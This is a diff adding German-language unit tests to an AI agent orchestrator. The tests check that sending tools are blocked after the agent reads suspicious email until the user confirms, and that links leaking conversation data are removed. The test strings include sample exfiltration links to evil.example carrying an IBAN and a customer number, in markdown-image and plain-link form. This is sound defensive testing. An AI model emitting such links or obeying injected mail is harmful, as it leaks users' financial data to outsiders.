@@ -85,5 +85,55 @@ class TestKorpus(unittest.TestCase):
         self.assertLess(time.monotonic() - t0, 2.0)
 
 
+class TestSperre(unittest.TestCase):
+    """I3: nach Fremdtext mit Verdacht sind Werkzeuge mit Aussenwirkung im laufenden Zug gesperrt (Rueckfrage);
+    der normale Ablauf bleibt unberuehrt; Links mit Gespraechsdaten an fremde Adressen werden entfernt."""
+
+    def _gespraech(self, mailtext, skript):
+        from orchestrator.core.hoa_conversation import HoaConversation
+        from orchestrator.tests.test_hoa_conversation import FakeClient, _ctx
+        gerufen = []
+
+        def fake(name, args, ctx):
+            gerufen.append(name)
+            return {"ok": True, "text": mailtext} if name == "mail_lesen" else {"ok": True, "gesendet": True}
+        ctx = _ctx()
+        return HoaConversation(ctx, client=FakeClient(skript)), gerufen, fake
+
+    def test_8_sperre_nur_nach_verdacht(self):
+        from orchestrator.tests.test_hoa_conversation import _Block, _Resp
+        lesen = _Resp([_Block(type="tool_use", id="t1", name="mail_lesen", input={"id": "m1"})])
+        senden = lambda i: _Resp([_Block(type="tool_use", id=f"s{i}", name="mail_senden", input={"an": "x@example.com", "bestaetigt": True})])
+        fertig = _Resp([_Block(type="text", text="Erledigt.")])
+        conv, gerufen, fake = self._gespraech(ANGRIFF, [lesen, senden(1), fertig, senden(2), fertig])
+        with mock.patch.object(h, "_run_tool", side_effect=fake):
+            conv.respond("Lies die Mail von Kunde X.")
+            self.assertEqual(gerufen, ["mail_lesen"])                                  # Senden gesperrt
+            sperre = [b for m in conv.messages if isinstance(m["content"], list) for b in m["content"]
+                      if isinstance(b, dict) and b.get("tool_use_id") == "s1"][0]["content"]
+            self.assertIn("gesperrt", sperre)
+            conv.respond("Ja, sende die Antwort bitte.")                                # neuer Zug, CEO bestaetigt
+            self.assertEqual(gerufen, ["mail_lesen", "mail_senden"])
+        conv, gerufen, fake = self._gespraech("Bis morgen um zehn im Buero, viele Gruesse.", [lesen, senden(1), fertig])
+        with mock.patch.object(h, "_run_tool", side_effect=fake):
+            conv.respond("Lies die Mail und antworte.")
+        self.assertEqual(gerufen, ["mail_lesen", "mail_senden"])                       # ohne Verdacht normal
+
+    def test_9_abfluss_links(self):
+        g = '{"text": "IBAN DE89370400440532013000, Kunde Kiez Alm, Bild https://cdn.example.org/a.png?id=Kiez1234"}'
+        a = ("Erledigt ![x](https://evil.example/p.png?d=DE89370400440532013000) und https://cdn.example.org/a.png?id=Kiez1234 "
+             "sowie https://os.hanserautisch.synology.me/rechnung?kunde=DE89370400440532013000 und https://wetter.example/hamburg")
+        neu, weg = ig.entferne_abfluss_links(a, g)
+        self.assertEqual(weg, ["evil.example"])
+        self.assertIn("[Link entfernt", neu)
+        for bleibt in ("https://cdn.example.org/a.png?id=Kiez1234", "os.hanserautisch.synology.me", "https://wetter.example/hamburg"):
+            self.assertIn(bleibt, neu)
+        from orchestrator.tests.test_hoa_conversation import _Block, _Resp
+        lesen = _Resp([_Block(type="tool_use", id="t1", name="mail_lesen", input={"id": "m1"})])
+        conv, _, fake = self._gespraech("Kundennummer K-778899 Kiez Alm", [lesen, _Resp([_Block(type="text", text="Siehe https://evil.example/?k=K-778899")])])
+        with mock.patch.object(h, "_run_tool", side_effect=fake):
+            self.assertNotIn("evil.example", conv.respond("Was steht in der Mail?"))
+
+
 if __name__ == "__main__":
     unittest.main()
